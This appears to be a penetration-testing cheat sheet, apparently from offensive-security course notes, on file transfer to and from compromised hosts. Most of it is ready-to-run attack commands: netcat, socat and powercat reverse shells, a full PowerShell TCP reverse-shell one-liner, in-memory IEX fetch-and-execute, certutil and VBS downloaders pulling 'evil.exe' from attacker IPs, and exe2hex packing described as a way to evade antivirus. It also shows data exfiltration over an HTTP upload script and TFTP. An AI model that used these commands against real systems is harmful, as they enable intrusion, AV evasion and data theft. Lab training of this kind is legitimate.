# File Transfers

### Linux 

scp (SSH):
- `scp <file> <remote_username>@<ssh_server>:</remote/directory>`
- i.e. `scp PrintSpoofer.exe sean@10.11.1.251:/home/sean`

wget (http/https):
- `wget -O <destination> <url>`
- i.e. `wget -O report.pdf https://www.site.com/report2123.pdf`

curl (imap(s)/pop3(s)/scp/sftp/smb(s)/telent/ftp):
- `curl -o <destination> <url>`
- i.e. `curl -o report.pdf https://www.site.com/report2123.pdf`

axel (ftp/http):
- `axel -a -n <#_of_connections> -o <destination> <url>`
- i.e. `axel -a -n 20 -o report.pdf https://www.site.com/report2123.pdf`

netcat:
- on server: `nc -nlvp <port> > <destination>`
- on client: `nc -nv <server_ip> <port> < <file>`
- i.e. server & client file transfer:
	- `nc -nlvp 4444 > incoming.exe`
	- `nc -nv 10.2.1.35 4444 < /usr/share/incoming.exe`
- i.e. shell:
	- `nc -nvlp 4444`
	- `nc -nv 10.2.1.35 4444 -e /bin/bash`

socat:
- on server: `sudo socat TCP4-LISTEN:<port>,fork file:<filename>`
- on client: `socat TCP4:<server_ip>:<port> file:<destination>,create`
- i.e. server & client file transfer:
	- `sudo socat TCP4-LISTEN:443,fork file:myFile.txt`
	- `socat TCP4:10.2.1.35:443 file:recieved_myFile.txt,create`
- i.e. shell:
	- `socat -d -d TCP4-LISTEN:443 STDOUT`
	- `socat TCP4:10.2.1.35:443 EXEC:/bin/bash`
- i.e. encrypted shell:
	- `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
	- `socat - OPENSSL:10.2.1.35:443,verify=0`

<br>

### Windows Downloads

PowerShell:
- enable unrestricted execution policy: `Set-ExecutionPolicy Unrestricted`
- file transfer: `powershell -c "(new-object System.Net.WebClient).DownloadFile('<url>', '<destination>')"
- i.e. file transfer: `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.2.1.35/wget.exe', 'C:\Users\offsec\Desktop\wget.exe')"`
- or `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')`
- i.e. as a script called `wget.ps1`:
	```powershell
	$webclient = New-Object System.Net.WebClient
	$url = "http://10.11.0.4/evil.exe"
	$file = "new-exploit.exe"
	$webclient.DownloadFile($url,$file)
	```
	- then execute with: `powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1`
- i.e. to download and execute without saving it to disk:
	- a) create a PowerShell script:
		- i.e. hellworld.ps1 = `Write-Output "Hello World"`
	- b) run PowerShell download:
		- i.e. `powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')`
- i.e shell (replace IP and port number):
	- server: `sudo nc -lvnp 443`
	- client: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close()"`
- from within a PowerShell shell: `Invoke-WebRequest -Uri <source> -OutFile <destination>`
	- i.e. `Invoke-WebRequest -Uri http://10.1.1.246:8080/PrintSpoofer.exe' -OutFile 'PrintSpoofer.exe'`

Certutil:
- usage: `certutil -urlcache -split -f <url> <location>`
- i.e. `certutil -urlcache -split -f http://192.168.111.66/nc.exe C:\\Users\\tony\\Desktop\\nc.exe`



Powercat: 
- first you need to download PowerCat to the WIndows host
- Dot-source the script:
	- i.e. `. .\powercat.ps1`
	- or if host Internet-connected: `iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')`
- i.e. file transfers:
	- server: `sudo nc -lvnp 443 > recieving_powercat.ps1`
	- client: `powercat -c 10.11.0.4 -p 443 -i C:\Users\offsec\powercat.ps1`
- i.e. shell
	- server: `sudo nc -lvnp 443`
	- client: `powercat -c 10.11.0.4 -p 443 -e cmd.exe`


Non-interactive FTP download:
- Windows OS ships with a default FTP client that can be used for file transfers (i.e. after setting up an FTP server on the attack machine)
- the `-s` flag accepts a text-based command list and can be used to effectively make the client non-interactive 
- a) change to the `/ftphome/` directory on the Kali machine and place a file for download (i.e. `nc.exe`)
- b) restart the configured Pure-FTPd service on Kali machine
	- i.e. `sudo systemctl restart pure-ftpd`
- c) build a text file of FTP commands you wish to execute on the Windows host
	- i.e. ftp.txt:
		```bash
		open 10.11.0.4.21
		USER offsec
		lab
		bin
		GET nc.exe
		bye
		```
		- `open` is used to initiate an FTP connection to Kali machine's IP address, then user credentials are entered, `bin` is used to request a binary transfer, `GET nc.exe` downloads the file, and `bye` closes the connection 
		- can `echo <cmd> > ftp.txt`, then `echo <cmd2> >> ftp.txt` to create `ftp.txt` on Windows machine
- d) on the Windows host, initiate the FTP connection: `ftp -v -n -s:ftp.txt`


VBS:
- the following set of non-interactive `echo` commands, when pasted into a remote shell, will write out a `wget.vbs` script that acts as a simple HTTP downloader:
	```basic
	echo strUrl = WScript.Arguments.Item(0) > wget.vbs
	echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
	echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
	echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
	echo Err.Clear >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >>
	wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >>
	wget.vbs
	echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
	echo http.Open "GET", strURL, False >> wget.vbs
	echo http.Send >> wget.vbs
	echo varByteArray = http.ResponseBody >> wget.vbs
	echo Set http = Nothing >> wget.vbs
	echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
	echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
	echo strData = "" >> wget.vbs
	echo strBuffer = "" >> wget.vbs
	echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
	echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
	echo Next >> wget.vbs
	echo ts.Close >> wget.vbs
	```
- you can run this with `cscript` to download files from your Kali machine:
	- i.e. `cscript wget.vbs http://10.11.0.4/evil.exe evil.exe`


exe2hex and PowerShell:
- to circumvent AV detection you can compress a binary you want to transfer, convert it to a hex string, and embed it into a Windows script 
- on the Windows machine you can paste this script into your shell and run it, where it will redirect the hex data into `powershell.exe` which will then assemble it back into a binary, all through non-interactive commands 
- a) locate the binary you want to transfer 
	- i.e. `locate nc.exe | grep binaries` -> `cp /usr/share/windows-resources/binaries/nc.exe`
- b) pack (compress) the PE binary to reduce it's file size 
	- i.e. `upx -9 nc.exe`
- c) convert the binary to a Windows script (`.cmd`) to run on the Windows machine 
	- i.e. `exe2hex -x nc.exe -p nc.cmd`
	- this will convert the file to hex and instruct `powershell.exe` to convert it back -- a script called `nc.cmd` is created 
- d) copy and paste the `nc.cmd` script into a shell on the Windows machine and run it -- this will create a perfectly-working copy of the original `nc.exe` program

<br>

### Windows Uploads

With PowerShell:
- usually, TFTP / FTP / HTTP servers are not enabled on Windows by default, which makes exfiltrating data from a target network using a Windows client difficult
- however, if HTTP traffic is allowed you can use the `System.Net.WebClient` PowerShell class to upload data to your Kali machine through an HTTP POST request.
- a) first, create a simple PHP script called `upload.php` in the Kali webroot directory `/var/www/html`
	```php
	<?php
	$uploaddir = '/var/www/uploads/';
	$uploadfile = $uploaddir . $_FILES['file']['name'];
	move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
	?>
	```
	- this PHP code processes an incoming file upload request and saves the transferred data to the `/var/www/uploads` directory
- b) create the `uploads` folder and modify its permissions to grant the "www-data" user ownership and subsequent write permissions 
	- i.e. `sudo mkdir /var/www/uploads` -> `sudo chown www-data: /var/www/uploads`
- c) on the compromised Windows host, invoke the `UploadFile` method from the `System.Net.WebClient` class to upload the document you want to exfiltrate 
	- i.e. `powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')`

With TFTP:
- if PowerShell is not installed (i.e. on older Windows versions), you may need to use VBScript, FTP, or TFTP (a UDP-based file transfer protocol that is often restricted by corporate egress firewalls) to exfiltrate data 
- TFTP is great for non-interactive file transfer, but it is not installed by default on newer Windows systems (Windows 7, Windows 2008, and newer)
- a) install and configure a TFTP server on Kali machine
	- i.e. `sudo apt update && sudo apt install atftp` -> `sudo mkdir /tftp` -> `sudo chown nobody: /tftp` -> `sudo atftpd --daemon --port 69 /tftp`
- b) on the Windows system, run the `tftp` client with `-i` to specify a binary image transfer, along with the IP address of the Kali machine, the `put` command to initiate an upload, and the filename of the file to upload 
	- i.e. `tftp -i 10.11.0.4 put important.docx`



<br>

### Creating a HTTP web server

Python:
- i.e. `python -m SimpleHTTPServer 8080`
- i.e. `python -m http.server 8080`

PHP:
- i.e. `ph -S 0.0.0.0:8080`

Ruby:
- i.e. `ruby -run -e httpd . -p 8080`

Busybox:
- i.e. `busybox httpd -f -p 8080`


<br>

### Using an FTP server 

1. install Pure-FTPd
	- i.e. `sudo apt update && sudo apt install pure-ftpd`
2. create a new user for Pure-FTPd
	- the following bash script will automate the user create:
	```bash
	#!/bin/bash
	
	sudo groupadd ftpgroup
	sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
	sudo pure-pw useradd offsec -u ftpuser -d /ftphome
	sudo pure-pw mkdb
	sudo cd /etc/pure-ftpd/auth/
	sudo ln -s ../conf/PureDB 60pdb
	sudo mkdir -p /ftphome
	sudo chown -R ftpuser:ftpgroup /ftphome/
	sudo systemctl restart pure-ftpd
	```
	- then: `chmod +x setup-ftp.sh && sudo ./setup-ftp.sh` (using "lab" as the password for the "offsec" user)
- when interacting with the FTP server you want to be using an interactive shell, this may require you to upgrade a non-interactive shell (i.e. a basic netcat reverse shell)
- to do this run `python -c 'import pty; pty.spawn("/bin/bash")'` from the non-interactive shell to spawn a new pty shell which you can use to interact with the FTP server (i.e. `ftp <attack_machine>`) to transfer files across 
- note, this only works on Linux machines with Python installed 